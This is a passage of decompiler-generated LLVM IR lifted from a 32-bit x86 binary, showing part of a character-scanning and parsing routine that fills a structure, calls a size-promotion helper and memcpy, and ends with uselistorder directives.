  %v0_80530ed = phi i32 [ %v1_80530ed, %dec_label_pc_80530ed ], [ ptrtoint ([9 x i8]* @global_var_805c118.495 to i32), %dec_label_pc_80530de ]
  %v4_80530e3 = phi i32 [ %v6_80530e3, %dec_label_pc_80530ed ], [ %v4_80530e3.pre, %dec_label_pc_80530de ]
  %v2_80530e3 = load i8, i8* %.pre, align 1
  %v3_80530e3 = zext i8 %v2_80530e3 to i32
  %v5_80530e3 = and i32 %v4_80530e3, -256
  %v6_80530e3 = or i32 %v3_80530e3, %v5_80530e3
  store i32 %v6_80530e3, i32* %eax.global-to-local, align 4
  %v3_80530e5 = inttoptr i32 %v0_80530ed to i8*
  %v4_80530e5 = load i8, i8* %v3_80530e5, align 1
  %v15_80530e5 = icmp eq i8 %v2_80530e3, %v4_80530e5
  br i1 %v15_80530e5, label %dec_label_pc_8052f55, label %dec_label_pc_80530ed

dec_label_pc_80530ed:                             ; preds = %dec_label_pc_80530e3
  %v1_80530ed = add i32 %v0_80530ed, 1
  store i32 %v1_80530ed, i32* @edx, align 4
  %v1_80530ee = inttoptr i32 %v1_80530ed to i8*
  %v2_80530ee = load i8, i8* %v1_80530ee, align 1
  %v3_80530ee = icmp eq i8 %v2_80530ee, 0
  %v1_80530f1 = icmp eq i1 %v3_80530ee, false
  br i1 %v1_80530f1, label %dec_label_pc_80530e3, label %dec_label_pc_80530f3

dec_label_pc_80530f3:                             ; preds = %dec_label_pc_80530ed, %dec_label_pc_8052f55
  %v0_8053106 = phi i32 [ %v1_8052f55, %dec_label_pc_8052f55 ], [ %v0_80530e3.pre.pre, %dec_label_pc_80530ed ]
  %v0_8053103 = phi i32 [ %v0_80530ed, %dec_label_pc_8052f55 ], [ %v1_80530ed, %dec_label_pc_80530ed ]
  %v1_80530f5 = add i32 %v0_8053103, -134594840
  %v1_80530fa = add i32 %v0_8053103, -134594841
  %v5_80530fa = sub i32 134594840, %v0_8053103
  %v6_80530fa = and i32 %v1_80530f5, %v5_80530fa
  %v7_80530fa = icmp slt i32 %v6_80530fa, 0
  %v8_80530fa = icmp eq i32 %v1_80530fa, 0
  %v9_80530fa = icmp slt i32 %v1_80530fa, 0
  store i32 %v1_80530fa, i32* %eax.global-to-local, align 4
  %v3_80530fb = icmp eq i1 %v9_80530fa, %v7_80530fa
  %v4_80530fb = icmp eq i1 %v8_80530fa, false
  %v5_80530fb = and i1 %v4_80530fb, %v3_80530fb
  br i1 %v5_80530fb, label %dec_label_pc_8053107, label %dec_label_pc_80530fd

dec_label_pc_80530fd:                             ; preds = %dec_label_pc_80530f3
  %v1_80530fd = inttoptr i32 %v0_8053106 to i8*
  %v2_80530fd = load i8, i8* %v1_80530fd, align 1
  %v3_80530fd = zext i8 %v2_80530fd to i32
  %v5_80530fd = and i32 %v1_80530fa, -256
  %v6_80530fd = or i32 %v3_80530fd, %v5_80530fd
  store i32 %v6_80530fd, i32* %eax.global-to-local, align 4
  %v3_80530ff = inttoptr i32 %v0_8053103 to i8*
  %v4_80530ff = load i8, i8* %v3_80530ff, align 1
  %v15_80530ff = icmp eq i8 %v2_80530fd, %v4_80530ff
  %v1_8053101 = icmp eq i1 %v15_80530ff, false
  br i1 %v1_8053101, label %dec_label_pc_8053107, label %dec_label_pc_8053103

dec_label_pc_8053103:                             ; preds = %dec_label_pc_80530fd
  %v1_8053103 = add i32 %v0_8053103, 9
  store i32 %v1_8053103, i32* @edx, align 4
  %v1_8053106 = add i32 %v0_8053106, 1
  store i32 %v1_8053106, i32* @esi, align 4
  br label %dec_label_pc_8053107

dec_label_pc_8053107:                             ; preds = %dec_label_pc_80530fd, %dec_label_pc_80530f3, %dec_label_pc_8053103
  %v4_805310b = phi i32 [ %v6_80530fd, %dec_label_pc_80530fd ], [ %v1_80530fa, %dec_label_pc_80530f3 ], [ %v6_80530fd, %dec_label_pc_8053103 ]
  %v0_805310b = phi i32 [ %v0_8053106, %dec_label_pc_80530fd ], [ %v0_8053106, %dec_label_pc_80530f3 ], [ %v1_8053106, %dec_label_pc_8053103 ]
  %v0_8053107 = phi i32 [ %v0_8053103, %dec_label_pc_80530fd ], [ %v0_8053103, %dec_label_pc_80530f3 ], [ %v1_8053103, %dec_label_pc_8053103 ]
  %v1_8053107 = add i32 %v0_8053107, 9
  %v2_8053107 = inttoptr i32 %v1_8053107 to i8*
  %v3_8053107 = load i8, i8* %v2_8053107, align 1
  %v4_8053107 = sext i8 %v3_8053107 to i32
  store i32 %v4_8053107, i32* %ebx.global-to-local, align 4
  %v1_805310b = inttoptr i32 %v0_805310b to i8*
  %v2_805310b = load i8, i8* %v1_805310b, align 1
  %v3_805310b = zext i8 %v2_805310b to i32
  %v5_805310b = and i32 %v4_805310b, -256
  %v6_805310b = or i32 %v3_805310b, %v5_805310b
  store i32 %v6_805310b, i32* %eax.global-to-local, align 4
  %v2_805310d = mul nsw i32 %v4_8053107, 256
  store i32 %v2_805310d, i32* %ebx.global-to-local, align 4
  %v4_8053110 = icmp eq i8 %v2_805310b, 0
  br i1 %v4_8053110, label %dec_label_pc_80532cd, label %dec_label_pc_8053118

dec_label_pc_8053118:                             ; preds = %dec_label_pc_8053107
  %v3_8053118 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053118, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_805c155.496 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8053121:                             ; preds = %dec_label_pc_8053171, %dec_label_pc_8053118
  %v0_8053171 = phi i32 [ %v1_8053171, %dec_label_pc_8053171 ], [ ptrtoint ([21 x i8]* @global_var_805c155.496 to i32), %dec_label_pc_8053118 ]
  %v3_8053121 = inttoptr i32 %v0_8053171 to i8*
  %v4_8053121 = load i8, i8* %v3_8053121, align 1
  %v15_8053121 = icmp eq i8 %v2_805310b, %v4_8053121
  %v1_8053123 = icmp eq i1 %v15_8053121, false
  br i1 %v1_8053123, label %dec_label_pc_8053171, label %dec_label_pc_8053125

dec_label_pc_8053125:                             ; preds = %dec_label_pc_8053121
  %v1_8053127 = add i32 %v0_8053171, -134594901
  store i32 %v1_8053127, i32* %edx.global-to-local, align 4
  %v7_8053130 = icmp sgt i32 %v1_8053127, 17
  br i1 %v7_8053130, label %dec_label_pc_8053132, label %dec_label_pc_805313b

dec_label_pc_8053132:                             ; preds = %dec_label_pc_8053125
  %v1_8053132 = add i32 %v0_8053171, -134594903
  store i32 %v1_8053132, i32* %eax.global-to-local, align 4
  %v3_8053135 = and i32 %v2_805310d, 1024
  %v4_8053135 = icmp eq i32 %v3_8053135, 0
  %v1_8053138 = icmp eq i1 %v4_8053135, false
  %v4_8053138 = select i1 %v1_8053138, i32 %v1_8053132, i32 %v1_8053127
  store i32 %v4_8053138, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805313b

dec_label_pc_805313b:                             ; preds = %dec_label_pc_8053125, %dec_label_pc_8053132
  %v0_8053144 = phi i32 [ %v1_8053127, %dec_label_pc_8053125 ], [ %v4_8053138, %dec_label_pc_8053132 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c14b.497 to i32), i32* %ecx.global-to-local, align 4
  %v2_8053144 = add i32 %tmp76, 32
  %v3_8053144 = inttoptr i32 %v2_8053144 to i32*
  store i32 %v0_8053144, i32* %v3_8053144, align 4
  %v0_8053147.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805314b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053147

dec_label_pc_8053147:                             ; preds = %dec_label_pc_8053147, %dec_label_pc_805313b
  %v0_8053147 = phi i32 [ %v1_8053147, %dec_label_pc_8053147 ], [ %v0_8053147.pre, %dec_label_pc_805313b ]
  %v1_8053147 = add i32 %v0_8053147, 1
  store i32 %v1_8053147, i32* %ecx.global-to-local, align 4
  %v1_8053148 = inttoptr i32 %v1_8053147 to i8*
  %v2_8053148 = load i8, i8* %v1_8053148, align 1
  %v3_8053148 = sext i8 %v2_8053148 to i32
  store i32 %v3_8053148, i32* %eax.global-to-local, align 4
  %v8_805314d = icmp sgt i32 %v0_805314b.pre, %v3_8053148
  br i1 %v8_805314d, label %dec_label_pc_8053147, label %dec_label_pc_805314f

dec_label_pc_805314f:                             ; preds = %dec_label_pc_8053147
  store i32 ptrtoint ([21 x i8]* @global_var_805c155.496 to i32), i32* @ecx, align 4
  %v1_8053156 = add i32 %v0_8053147, -134594891
  store i32 %v1_8053156, i32* %eax.global-to-local, align 4
  %v2_805315b = add i32 %v0_8053147, add (i32 ptrtoint (i32* @global_var_805c13c.498 to i32), i32 -134594891)
  %v3_805315b = add i32 %v2_805315b, %v1_8053156
  %v4_805315b = inttoptr i32 %v3_805315b to i16*
  %v5_805315b = load i16, i16* %v4_805315b, align 2
  %v6_805315b = sext i16 %v5_805315b to i32
  store i32 %v6_805315b, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8053156, 2
  %v3_8053163 = add i32 %factor, 134594860
  %v4_8053163 = inttoptr i32 %v3_8053163 to i16*
  %v5_8053163 = load i16, i16* %v4_8053163, align 2
  %v6_8053163 = sext i16 %v5_8053163 to i32
  store i32 %v6_8053163, i32* %eax.global-to-local, align 4
  %v1_805316b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805316b = or i32 %v1_805316b, %v6_805315b
  %v2_805316d = and i32 %v2_805316b, %v6_8053163
  store i32 %v2_805316d, i32* %edx.global-to-local, align 4
  %v0_805317f.pre = load i32, i32* @esi, align 4
  %v0_8053182.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053177

dec_label_pc_8053171:                             ; preds = %dec_label_pc_8053121
  %v1_8053171 = add i32 %v0_8053171, 1
  store i32 %v1_8053171, i32* @ecx, align 4
  %v1_8053172 = inttoptr i32 %v1_8053171 to i8*
  %v2_8053172 = load i8, i8* %v1_8053172, align 1
  %v3_8053172 = icmp eq i8 %v2_8053172, 0
  %v1_8053175 = icmp eq i1 %v3_8053172, false
  br i1 %v1_8053175, label %dec_label_pc_8053121, label %dec_label_pc_8053177

dec_label_pc_8053177:                             ; preds = %dec_label_pc_8053171, %dec_label_pc_805314f
  %v0_8053182 = phi i32 [ %v0_8053182.pre, %dec_label_pc_805314f ], [ %storemerge4, %dec_label_pc_8053171 ]
  %v0_805317f = phi i32 [ %v0_805317f.pre, %dec_label_pc_805314f ], [ %v0_805310b, %dec_label_pc_8053171 ]
  %v0_8053177 = phi i32 [ %v2_805316d, %dec_label_pc_805314f ], [ %v3_8053118, %dec_label_pc_8053171 ]
  store i32 %v0_8053177, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805317f = inttoptr i32 %v0_805317f to i8*
  %v2_805317f = load i8, i8* %v1_805317f, align 1
  %v3_805317f = sext i8 %v2_805317f to i32
  store i32 %v3_805317f, i32* %eax.global-to-local, align 4
  %v2_8053182 = add i32 %tmp76, 4
  %v3_8053182 = inttoptr i32 %v2_8053182 to i32*
  store i32 %v0_8053182, i32* %v3_8053182, align 4
  %v0_8053185 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053185 = load i32, i32* @edx, align 4
  %v2_8053185 = add i32 %v1_8053185, 12
  %v3_8053185 = inttoptr i32 %v2_8053185 to i32*
  store i32 %v0_8053185, i32* %v3_8053185, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805318c = load i32, i32* @edx, align 4
  %v1_805318c = add i32 %v0_805318c, 28
  %v2_805318c = inttoptr i32 %v1_805318c to i32*
  store i32 1, i32* %v2_805318c, align 4
  %v0_8053193 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053193 = load i32, i32* @edx, align 4
  %v2_8053193 = add i32 %v1_8053193, 8
  %v3_8053193 = inttoptr i32 %v2_8053193 to i32*
  store i32 %v0_8053193, i32* %v3_8053193, align 4
  %v0_8053196 = load i32, i32* %edi.global-to-local, align 4
  %v1_80531a0 = and i32 %v0_8053196, -5
  %v0_80531a6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80531a6 = and i32 %v0_80531a6, 3840
  store i32 %v1_80531a6, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_80531af = or i32 %v1_80531a6, %v1_80531a0
  store i32 %v2_80531af, i32* @edi, align 4
  %v1_80531b1 = load i32, i32* @edx, align 4
  %v2_80531b1 = add i32 %v1_80531b1, 20
  %v3_80531b1 = inttoptr i32 %v2_80531b1 to i32*
  store i32 48, i32* %v3_80531b1, align 4
  %v0_80531b4 = load i32, i32* @edi, align 4
  %v1_80531b4 = load i32, i32* @edx, align 4
  %v2_80531b4 = add i32 %v1_80531b4, 16
  %v3_80531b4 = inttoptr i32 %v2_80531b4 to i32*
  store i32 %v0_80531b4, i32* %v3_80531b4, align 4
  %v0_80531b7 = load i32, i32* @ecx, align 4
  %v1_80531b7 = inttoptr i32 %v0_80531b7 to i8*
  %v2_80531b7 = load i8, i8* %v1_80531b7, align 1
  %v3_80531b7 = icmp eq i8 %v2_80531b7, 0
  %v1_80531ba = icmp eq i1 %v3_80531b7, false
  br i1 %v1_80531ba, label %dec_label_pc_80531d3, label %dec_label_pc_80531bc

dec_label_pc_80531bc:                             ; preds = %dec_label_pc_8053177
  %v0_80531bc = load i32, i32* @esi, align 4
  %v1_80531bc = inttoptr i32 %v0_80531bc to i8*
  %v2_80531bc = load i8, i8* %v1_80531bc, align 1
  %v11_80531bc = icmp eq i8 %v2_80531bc, 109
  %v1_80531bf = icmp eq i1 %v11_80531bc, false
  br i1 %v1_80531bf, label %dec_label_pc_80532cd, label %dec_label_pc_80531c5

dec_label_pc_80531c5:                             ; preds = %dec_label_pc_80531bc
  %v0_80531c5 = load i32, i32* @edx, align 4
  %v1_80531c5 = add i32 %v0_80531c5, 32
  %v2_80531c5 = inttoptr i32 %v1_80531c5 to i32*
  store i32 20, i32* %v2_80531c5, align 4
  %v0_80531cc = load i32, i32* @edx, align 4
  %v1_80531cc = add i32 %v0_80531cc, 28
  %v2_80531cc = inttoptr i32 %v1_80531cc to i32*
  store i32 0, i32* %v2_80531cc, align 4
  br label %dec_label_pc_80531d3

dec_label_pc_80531d3:                             ; preds = %dec_label_pc_8053177, %dec_label_pc_80531c5
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805326f, label %dec_label_pc_80531de

dec_label_pc_80531de:                             ; preds = %dec_label_pc_80531d3
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_8053257 = add i32 %tmp76, 40
  %v4_80531ed = add i32 %tmp76, 36
  %v1_8053260 = add i32 %tmp76, 28
  %v2_8053260 = inttoptr i32 %v1_8053260 to i32*
  br label %dec_label_pc_80531e0

dec_label_pc_80531e0:                             ; preds = %dec_label_pc_805325b, %dec_label_pc_80531de
  %v0_80531f6 = phi i32 [ 0, %dec_label_pc_80531de ], [ %v1_805325f, %dec_label_pc_805325b ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80531de ], [ %stack_var_-88.5, %dec_label_pc_805325b ]
  %v1_80531e0 = add i32 %v0_80531f6, -2
  %v6_80531e0 = sub i32 1, %v0_80531f6
  %v7_80531e0 = and i32 %v6_80531e0, %v0_80531f6
  %v8_80531e0 = icmp slt i32 %v7_80531e0, 0
  %v9_80531e0 = icmp eq i32 %v1_80531e0, 0
  %v10_80531e0 = icmp slt i32 %v1_80531e0, 0
  %v3_80531e3 = icmp eq i1 %v10_80531e0, %v8_80531e0
  %v4_80531e3 = icmp eq i1 %v9_80531e0, false
  %v5_80531e3 = and i1 %v4_80531e3, %v3_80531e3
  br i1 %v5_80531e3, label %dec_label_pc_80531f6, label %dec_label_pc_80531e5

dec_label_pc_80531e5:                             ; preds = %dec_label_pc_80531e0
  %v0_80531e5 = load i32, i32* @esp, align 4
  %v2_80531e5 = mul i32 %v0_80531f6, 4
  %v3_80531e5 = add i32 %v2_80531e5, 68
  %v4_80531e5 = add i32 %v3_80531e5, %v0_80531e5
  %v5_80531e5 = inttoptr i32 %v4_80531e5 to i32*
  %v6_80531e5 = load i32, i32* %v5_80531e5, align 4
  store i32 %v6_80531e5, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80531ed = trunc i32 %v6_80531e5 to i8
  %v5_80531ed = add i32 %v4_80531ed, %v0_80531f6
  %v6_80531ed = inttoptr i32 %v5_80531ed to i8*
  store i8 %v1_80531ed, i8* %v6_80531ed, align 1
  %v0_80531f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531f1 = urem i32 %v0_80531f1, 256
  br label %dec_label_pc_80531ff

dec_label_pc_80531f6:                             ; preds = %dec_label_pc_80531e0
  %v5_80531f8 = add i32 %v0_80531f6, %stack_var_-32.3
  store i32 %v5_80531f8, i32* %eax.global-to-local, align 4
  %v1_80531fc = add i32 %v5_80531f8, -2
  br label %dec_label_pc_80531ff

dec_label_pc_80531ff:                             ; preds = %dec_label_pc_80531e5, %dec_label_pc_80531f6
  %v0_8053212 = phi i32 [ %v1_80531f1, %dec_label_pc_80531e5 ], [ %v1_80531fc, %dec_label_pc_80531f6 ]
  store i32 %v0_8053212, i32* %eax.global-to-local, align 4
  %v5_80531ff = sub i32 %v0_8053212, %stack_var_-88.4
  %v11_80531ff = xor i32 %v0_8053212, %stack_var_-88.4
  %v12_80531ff = xor i32 %v5_80531ff, %v0_8053212
  %v13_80531ff = and i32 %v12_80531ff, %v11_80531ff
  %v14_80531ff = icmp slt i32 %v13_80531ff, 0
  %v15_80531ff = icmp eq i32 %v5_80531ff, 0
  %v16_80531ff = icmp slt i32 %v5_80531ff, 0
  %v3_8053203 = icmp ne i1 %v16_80531ff, %v14_80531ff
  %v4_8053203 = or i1 %v15_80531ff, %v3_8053203
  br i1 %v4_8053203, label %dec_label_pc_8053212, label %dec_label_pc_8053205

dec_label_pc_8053205:                             ; preds = %dec_label_pc_80531ff
  %v1_8053205 = add i32 %v0_8053212, -9
  %v6_8053205 = sub i32 8, %v0_8053212
  %v7_8053205 = and i32 %v6_8053205, %v0_8053212
  %v8_8053205 = icmp slt i32 %v7_8053205, 0
  %v9_8053205 = icmp eq i32 %v1_8053205, 0
  %v10_8053205 = icmp slt i32 %v1_8053205, 0
  %v3_8053208 = icmp eq i1 %v10_8053205, %v8_8053205
  %v4_8053208 = icmp eq i1 %v9_8053205, false
  %v5_8053208 = and i1 %v4_8053208, %v3_8053208
  br i1 %v5_8053208, label %dec_label_pc_80532cd, label %dec_label_pc_8053212

dec_label_pc_8053212:                             ; preds = %dec_label_pc_8053205, %dec_label_pc_80531ff
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_80531ff ], [ %v0_8053212, %dec_label_pc_8053205 ]
  %v1_8053212 = add i32 %v0_8053212, -1
  store i32 %v1_8053212, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805321b = load i32, i32* @esp, align 4
  %v1_805321b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805321b = mul i32 %v1_805321b, 4
  %v3_805321b = add i32 %v0_805321b, 80
  %v4_805321b = add i32 %v3_805321b, %v2_805321b
  %v5_805321b = inttoptr i32 %v4_805321b to i32*
  %v6_805321b = load i32, i32* %v5_805321b, align 4
  store i32 %v6_805321b, i32* %edi.global-to-local, align 4
  %v2_805321f = mul i32 %v1_8053212, 4
  %v4_805321f = add i32 %v4_8053257, %v2_805321f
  %v5_805321f = inttoptr i32 %v4_805321f to i32*
  %v6_805321f = load i32, i32* %v5_805321f, align 4
  store i32 %v6_805321f, i32* @eax, align 4
  %v9_8053223 = icmp eq i32 %v6_805321b, 8
  br i1 %v9_8053223, label %dec_label_pc_805325b, label %dec_label_pc_8053228

dec_label_pc_8053228:                             ; preds = %dec_label_pc_8053212
  %v9_8053228 = icmp eq i32 %v6_805321f, 8
  br i1 %v9_8053228, label %dec_label_pc_805324b, label %dec_label_pc_805322d

dec_label_pc_805322d:                             ; preds = %dec_label_pc_8053228
  %v12_805322d = icmp eq i32 %v6_805321f, %v6_805321b
  br i1 %v12_805322d, label %dec_label_pc_805324b, label %dec_label_pc_8053231

dec_label_pc_8053231:                             ; preds = %dec_label_pc_805322d
  %v1_8053231 = call i32 @_promoted_size(i32 %v1_8053212)
  store i32 %v1_8053231, i32* %ebx.global-to-local, align 4
  %v0_8053238 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8053238, i32* @eax, align 4
  %v1_805323a = call i32 @_promoted_size(i32 %v1_8053212)
  %v2_805323f = sub i32 %v1_8053231, %v1_805323a
  %v8_805323f = xor i32 %v1_8053231, %v1_805323a
  %v9_805323f = xor i32 %v2_805323f, %v1_8053231
  %v10_805323f = and i32 %v9_805323f, %v8_805323f
  %v11_805323f = icmp slt i32 %v10_805323f, 0
  %v12_805323f = icmp eq i32 %v2_805323f, 0
  %v13_805323f = icmp slt i32 %v2_805323f, 0
  %v3_8053241 = icmp ne i1 %v13_805323f, %v11_805323f
  %v4_8053241 = or i1 %v12_805323f, %v3_8053241
  %v5_8053241 = zext i1 %v4_8053241 to i32
  store i32 %v5_8053241, i32* %eax.global-to-local, align 4
  %v1_8053247 = icmp eq i1 %v4_8053241, false
  br i1 %v1_8053247, label %dec_label_pc_805325b, label %dec_label_pc_8053231.dec_label_pc_805324b_crit_edge

dec_label_pc_8053231.dec_label_pc_805324b_crit_edge: ; preds = %dec_label_pc_8053231
  %v0_805324b.pre = load i32, i32* @esp, align 4
  %v1_805324b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805324b

dec_label_pc_805324b:                             ; preds = %dec_label_pc_8053231.dec_label_pc_805324b_crit_edge, %dec_label_pc_805322d, %dec_label_pc_8053228
  %v1_805324b = phi i32 [ %v1_805324b.pre, %dec_label_pc_8053231.dec_label_pc_805324b_crit_edge ], [ %v1_805321b, %dec_label_pc_805322d ], [ %v1_805321b, %dec_label_pc_8053228 ]
  %v0_805324b = phi i32 [ %v0_805324b.pre, %dec_label_pc_8053231.dec_label_pc_805324b_crit_edge ], [ %v0_805321b, %dec_label_pc_805322d ], [ %v0_805321b, %dec_label_pc_8053228 ]
  %v2_805324b = mul i32 %v1_805324b, 4
  %v3_805324b = add i32 %v0_805324b, 80
  %v4_805324b = add i32 %v3_805324b, %v2_805324b
  %v5_805324b = inttoptr i32 %v4_805324b to i32*
  %v6_805324b = load i32, i32* %v5_805324b, align 4
  store i32 %v6_805324b, i32* %eax.global-to-local, align 4
  store i32 %v1_8053212, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_805324b, i32* %v5_805321f, align 4
  br label %dec_label_pc_805325b

dec_label_pc_805325b:                             ; preds = %dec_label_pc_8053231, %dec_label_pc_8053212, %dec_label_pc_805324b
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805325f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805325f = add i32 %v0_805325f, 1
  store i32 %v1_805325f, i32* %ebp.global-to-local, align 4
  %v3_8053260 = load i32, i32* %v2_8053260, align 4
  %v1_8053263 = add i32 %v3_8053260, 2
  store i32 %v1_8053263, i32* %eax.global-to-local, align 4
  %v5_8053268 = icmp slt i32 %v1_805325f, %v1_8053263
  br i1 %v5_8053268, label %dec_label_pc_80531e0, label %dec_label_pc_8053296

dec_label_pc_805326f:                             ; preds = %dec_label_pc_80531d3
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8053273 = add i32 %tmp76, 38
  %v2_8053273 = inttoptr i32 %v1_8053273 to i8*
  store i8 1, i8* %v2_8053273, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805327c = add i32 %tmp76, 28
  %v2_805327c = inttoptr i32 %v1_805327c to i32*
  %v3_805327c = load i32, i32* %v2_805327c, align 4
  %v2_805327f = mul i32 %v3_805327c, 4
  %v2_8053283 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805328a = add i32 %tmp76, 40
  store i32 %v1_805328a, i32* %eax.global-to-local, align 4
  %v3_805328e = inttoptr i32 %v1_805328a to i16*
  %v4_805328e = call i32 @memcpy(i16* %v3_805328e, i32 %v2_8053283, i32 %v2_805327f)
  store i32 %v4_805328e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053296

dec_label_pc_8053296:                             ; preds = %dec_label_pc_805325b, %dec_label_pc_805326f
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805326f ], [ %stack_var_-88.5, %dec_label_pc_805325b ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805329e = inttoptr i32 %v1_8052f3f to i8*
  %v3_805329e = load i8, i8* %v2_805329e, align 1
  %v5_805329e = icmp slt i8 %v3_805329e, 0
  store i32 %stack_var_-88.6, i32* %v2_8052f38, align 4
  br i1 %v5_805329e, label %dec_label_pc_80532ae, label %dec_label_pc_80532a7

dec_label_pc_80532a7:                             ; preds = %dec_label_pc_8053296
  %v0_80532a7 = load i32, i32* @esi, align 4
  %v1_80532a7 = add i32 %v0_80532a7, 1
  store i32 %v1_80532a7, i32* %eax.global-to-local, align 4
  %v1_80532aa = load i32, i32* @ecx, align 4
  %v2_80532aa = inttoptr i32 %v1_80532aa to i32*
  store i32 %v1_80532a7, i32* %v2_80532aa, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_80532ae:                             ; preds = %dec_label_pc_8053296
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_8052f0c, i32* %edx.global-to-local, align 4
  %v0_80532b6 = load i32, i32* @esi, align 4
  %v2_80532b6 = sub i32 %v0_80532b6, %v4_8052f0c
  store i32 %v2_80532b6, i32* %esi.global-to-local, align 4
  %v1_80532b8 = mul i32 %v2_80532b6, 4
  %v2_80532b8 = add i32 %v1_80532b8, 224
  store i32 %v2_80532b8, i32* %eax.global-to-local, align 4
  %v2_80532bf = load i32, i32* %arg1, align 4
  %v4_80532bf = add i32 %v2_80532bf, %v2_80532b8
  store i32 %v4_80532bf, i32* %arg1, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_80532c1:                             ; preds = %dec_label_pc_80532a7, %dec_label_pc_80532ae
  store i32 %tmp76, i32* @edx, align 4
  %v1_80532c5 = add i32 %tmp76, 28
  %v2_80532c5 = inttoptr i32 %v1_80532c5 to i32*
  %v3_80532c5 = load i32, i32* %v2_80532c5, align 4
  store i32 %v3_80532c5, i32* %eax.global-to-local, align 4
  %v1_80532c8 = add i32 %v3_80532c5, 2
  br label %dec_label_pc_80532d0

dec_label_pc_80532cd:                             ; preds = %dec_label_pc_8052f5d, %dec_label_pc_8052ff7, %dec_label_pc_805302a, %dec_label_pc_80530a5, %dec_label_pc_8053091, %dec_label_pc_8053088, %dec_label_pc_8053205, %dec_label_pc_80531bc, %dec_label_pc_8053107
  br label %dec_label_pc_80532d0

dec_label_pc_80532d0:                             ; preds = %dec_label_pc_80532c1, %dec_label_pc_80532cd
  %storemerge6 = phi i32 [ %v1_80532c8, %dec_label_pc_80532c1 ], [ -1, %dec_label_pc_80532cd ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_80532d3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80532d3, i32* @ebx, align 4
  store i32 %v0_8052f0b, i32* @esi, align 4
  store i32 %v0_8052f0a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_805325f, { 0, 2, 1 }
  uselistorder i32 %v2_805323f, { 1, 2, 0 }
  uselistorder i32 %v1_8053231, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8053212, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8053205, { 1, 0 }
  uselistorder i32 %v5_80531ff, { 1, 2, 0 }
  uselistorder i32 %v0_8053212, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_80531e0, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_80531f6, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_8053171, { 1, 2, 0 }
  uselistorder i32 %v1_8053147, { 1, 2, 0 }
  uselistorder i32 %v0_8053171, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805310d, { 1, 0 }
  uselistorder i32 %v1_80530fa, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8053103, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_80530ed, { 0, 2, 3, 1 }
  uselistorder i32 %v6_80530e3, { 1, 0 }
  uselistorder i32 %v1_80530c5, { 1, 0 }
  uselistorder i32 %v0_80530e3.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_80530a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805309f, { 1, 2, 0 }
  uselistorder i32 %v0_8053065, { 1, 0 }
  uselistorder i32 %v1_8053057, { 1, 0 }
  uselistorder i32 %v1_8053052, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8053050, { 2, 0, 1 }
  uselistorder i32 %v0_8053072, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805300d, { 1, 2, 0 }
  uselistorder i32 %v0_8052fe5, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_8052fdb, { 1, 2, 0 }
  uselistorder i32 %v6_8052fd9, { 0, 2, 1 }
  uselistorder i32 %v0_8052fd8, { 1, 2, 3, 0, 4, 6, 5 }
